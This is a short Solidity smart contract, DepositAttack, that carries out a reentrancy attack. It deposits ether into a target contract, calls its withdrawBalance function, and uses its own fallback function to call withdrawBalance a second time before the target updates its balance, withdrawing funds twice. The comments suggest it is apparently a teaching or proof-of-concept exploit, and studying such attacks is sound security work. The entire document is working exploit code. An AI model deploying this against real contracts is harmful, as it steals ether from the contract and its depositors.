contract DepositAttack {
    bool public attackModeIsOn=false; 
    address public vulnerable_contract;

    function launch_attack(address _vulnerable_contract) payable public{
        attackModeIsOn = true;

        vulnerable_contract = _vulnerable_contract ;
        // call addToBalance with msg.value ethers
        vulnerable_contract.call.value(msg.value)(abi.encodeWithSignature("deposit()"));
        // call withdrawBalance
        // withdrawBalance calls the fallback of ReentranceExploit
        vulnerable_contract.call(abi.encodeWithSignature("withdrawBalance()"));
    }  


    function () external payable{
        // atackModeIsOn is used to execute the attack only once
        // otherwise there is a loop between withdrawBalance and the fallback function
        if (attackModeIsOn){
            attackModeIsOn = false;
                vulnerable_contract.call(abi.encodeWithSignature("withdrawBalance()"));
        }
    }

}